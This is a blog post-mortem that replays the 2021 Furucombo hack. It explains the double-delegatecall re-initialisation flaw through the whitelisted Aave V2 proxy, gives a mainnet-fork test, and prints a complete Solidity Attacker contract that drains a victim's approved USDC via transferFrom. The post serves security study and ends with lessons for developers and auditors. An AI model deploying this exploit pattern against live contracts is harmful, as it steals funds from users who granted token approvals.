---
title: Replaying Ethereum Hacks - Furucombo
date: 2021-02-28
image: ./featured.jpg
categories:
- Tech
- ETH
- security
- replaying-eth
medium:
- eos
- Programming
- blockchain
- cryptocurrency
- javascript
steem:
- eos
- utopian-io
- steemdev
- programming
- cryptocurrency
---

[Furucombo](https://furucombo.app/) has been [exploited yesterday for ~15M USD](https://twitter.com/furucombo/status/1365805935109677056).

- [Attacker Address](https://etherscan.io/address/0xb624e2b10b84a41687caec94bdd484e48d76b212)
- [_Exploit Setup Transaction_](https://ethtx.info/mainnet/0x6a14869266a1dcf3f51b102f44b7af7d0a56f1766e5b1908ac80a6a23dbaf449)

Let's dive into the attack, understand it by reading the code of the relevant contracts, and then replay the hack using a custom contract.

## Background


Furucombo lets users build custom DeFi flows through a drag'n'drop interface - think [Zapier](https://zapier.com/) or [If This Then That](https://ifttt.com/) for DeFi.

The entry-point for the attack is the [Furucombo Proxy](https://etherscan.io/address/0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f#code) that some users approved with many different tokens worth millions of dollars. The gist of the attack is that anyone can call into the contract, make it do a `delegatecall` to a user-controlled contract, which then calls `transferFrom` to steal previously-approved user tokens. However, as we will see, this `delegatecall` is done through another layer of indirection, the Aave V2 Proxy.

The following code is run when calling the `batchExec` function:

```solidity
function batchExec(
    address[] memory tos,
    bytes32[] memory configs,
    bytes[] memory datas
) public payable {
    _preProcess(); // not important 
    _execs(tos, configs, datas); // LOOK HERE
    _postProcess(); // not important
}

function _execs(
        address[] memory tos,
        bytes32[] memory configs,
        bytes[] memory datas
    ) internal {
  // ...
  for (uint256 i = 0; i < tos.length; i++) {
      // Check if the data contains dynamic parameter
      if (!configs[i].isStatic()) {
          // not important
      }
      // Check if the output will be referenced afterwards
      if (configs[i].isReferenced()) {
          // not important
      } else {
          // LOOK HERE
          _exec(tos[i], datas[i]);
      }
      // not important
  }
}

function _exec(address _to, bytes memory _data)
    internal
    returns (bytes memory result)
{
    // PERFORMS WHITELIST CHECK
    // expands to IRegistry(_getRegistry()).isValid(_to);
    require(_isValid(_to), "Invalid handler");
    _addCubeCounter();
    assembly {
        let succeeded := delegatecall(
            sub(gas(), 5000),
            _to,
            add(_data, 0x20),
            mload(_data),
            0,
            0
        )
        
        // ... more stuff
    }
}
```

Anyone can call `batchExec` with a list of contracts and payloads, and these contracts are then processed one by one. **If the contract is valid** a `delegatecall` to the contract is executed.
At the time of the exploit the [Aave V2 contract](https://etherscan.io/address/0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9#code) **was registered as valid**.
Notice how the Aave contract is a proxy contract itself:

```solidity
contract InitializableUpgradeabilityProxy is BaseUpgradeabilityProxy {
  function initialize(address _logic, bytes memory _data) public payable {
    require(_implementation() == address(0));
    assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1));
    _setImplementation(_logic);
    if (_data.length > 0) {
      (bool success, ) = _logic.delegatecall(_data);
      require(success);
    }
  }

  fallback() external payable {
    _willFallback();
    _delegate(_implementation());
  }

  // inherited from Proxy
  function _delegate(address implementation) internal {
    assembly {
      calldatacopy(0, 0, calldatasize())

      // Call the implementation.
      // ANOTHER DELEGATECALL TO THE IMPLEMENTATION
      let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

      // ... more stuff
    }
  }

  // noop
  function _willFallback() internal virtual {}
}
```

In its `fallback` function it does another `delegatecall` to the implementation logic contract.
And anyone can set the implementation contract by calling its `initialize` action.

One fundamental thing to understand here is that when doing a `delegatecall`, the storage **of the caller** is used. This contract might already be initialized under its own context storage, but it was not initialized in the Furucombo contract's storage yet. I am also not sure if it was ever supposed to be initialized from the Furucombo proxy or why it was added to the whitelist. Fact is, that it allows a _delegatecall_ to the attacker contract through these two steps:

1. Setup: Call `Furucombo.batchExec` with the `AaveV2Proxy` address. This passes the whitelist and _delegatecall_s to the Aave proxy. The attacker chooses the function data to be `initialize(attackerContract)` which then sets the implementation contract to the attacker contract.
2. Attack: The attacker can now use the double-delegation chain to call into their attacker contract while still being under the Furucombo contract's context. The attacker contract itself is simple and just needs to call `transferFrom(victim, attacker, allowedBalance)` to steal the funds from victims that approved the Furucombo contract.
  > `Furucombo.batchExec(aaveV2Proxy, attackerData)`  
  > `=delegatecall=> aaveV2Proxy.fallback(attackerData)`  
  > `=delegatecall=> aaveV2Proxy.logicContract.fallback(attackerData)`

## Implementation

Let's replay this hack to confirm the attack vector.
It's enough to replay the attack for a single victim, stealing other tokens is the same. For example, we can replay [this transaction](https://etherscan.io/tx/0x8bf64bd802d039d03c63bf3614afc042f345e158ea0814c74be4b5b14436afb9) which steals 1.7M USDC among other tokens.

```typescript
describe("Furucombo Hack", function () {
  // USDC victim of this hack transaction:
  // https://etherscan.io/tx/0x8bf64bd802d039d03c63bf3614afc042f345e158ea0814c74be4b5b14436afb9
  const victimAddress = `0x13f6f084e5faded2276def5149e71811a7abeb69`;
  let victimBalance: BigNumber;

  it("checks allowances", async function () {
    // check that a victim approved the furucombo proxy
    victimBalance = await usdc.balanceOf(victimAddress);
    const allowance = await usdc.allowance(
      victimAddress,
      furucomboProxy.address
    );
    console.log(
      `Victim USDC balance: ${ethers.utils.formatUnits(
        victimBalance,
        6
      )}\nAllowance of Furucombo Proxy: ${allowance.toHexString()}`
    );
  });

  it("checks _isValid(aaveV2Proxy)", async function () {
    // is a private storage field, need to read it raw
    const HANDLER_REGISTRY_SLOT = `0x6874162fd62902201ea0f4bf541086067b3b88bd802fac9e150fd2d1db584e19`;
    const registryAddr = BigNumber.from(
      await ethers.provider.getStorageAt(
        furucomboProxy.address,
        HANDLER_REGISTRY_SLOT
      )
    ).toHexString();
    console.log(`Registry address: ${registryAddr}`);
    const registry = await ethers.getContractAt(`IRegistry`, registryAddr);
    const isValid = await registry.isValid(aaveV2Proxy.address);
    expect(isValid, "!isValid").to.be.true;
  });
});
```

We fork the ETH mainnet from block number `11940499` and confirm that the victim approved the Furucombo contract and that the Aave V2 proxy is registered as valid.

For the actual attack, we can create a smart contract that has two functions, one for the `setup` step, one for the `attack`:

```solidity
contract Attacker {
    IProxy public constant furucombo =
        IProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
    IAaveV2Proxy public constant aaveV2Proxy =
        IAaveV2Proxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    function setup() external payable {
        // https://ethtx.info/mainnet/0x6a14869266a1dcf3f51b102f44b7af7d0a56f1766e5b1908ac80a6a23dbaf449
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        // aaveV2Proxy is whitelisted and passes registry._isValid(aaveV2Proxy)
        // then delegatecalls to aaveV2Proxy.initialize(this, "");
        // which stores implementation address
        tos[0] = address(aaveV2Proxy);
        datas[0] = abi.encodeWithSelector(
            aaveV2Proxy.initialize.selector,
            address(this),
            ""
        );
        furucombo.batchExec(tos, configs, datas);
    }

    function attack(IERC20 token, address sender) external payable {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        tos[0] = address(aaveV2Proxy);
        datas[0] = abi.encodeWithSelector(
            this.attackDelegated.selector,
            token,
            sender
        );
        // aaveV2Proxy is whitelisted and passes registry._isValid(aaveV2Proxy)
        // then delegatecalls to aaveV2Proxy.fallback
        // which delegatecalls again to its implementation address
        // which was changed in setup to "this"
        // meaning, furucombo delegatecalls to this.attackDelegated
        furucombo.batchExec(tos, configs, datas);
    }

    function attackDelegated(IERC20 token, address sender) external payable {
        token.transferFrom(sender, tx.origin, token.balanceOf(sender));
    }
}
```

Calling `setup` followed by `attack(usdcAddress, victimAddress)` does indeed end up netting the attacker 1.7M USDC.
The full test code is available [in this repo](https://github.com/MrToph/replaying-ethereum-hacks/blob/master/test/furucombo.ts).

To sum up:

- Be careful of initializer functions. There is no such thing as "a contract (or storage field) is initialized", it's always relative to the current context - which can be changed via `delegatecall`
- Having a whitelist is great, but blindly adding a contract to a whitelist because it's from a well-known, audited project is a bad idea. Check how the contract composes with your project

## Audits

A question that I've seen being asked a lot is why this hasn't been caught during the audits.
In general, audits are done on the smart contract code **disregarding any deployments**.
This attack was only possible because the Furucombo team keeps a **dynamic whitelist** and they manually whitelisted a vulnerable contract.
While the audit should definitely have stated that one needs to check whether whitelisting a contract leads to vulnerabilities, the decision on what contracts to add, and therefore the responsibility to do due diligence, is solely on the project party.


> This post is part of the [Replaying Ethereum Hacks series](/categories/replaying-eth)

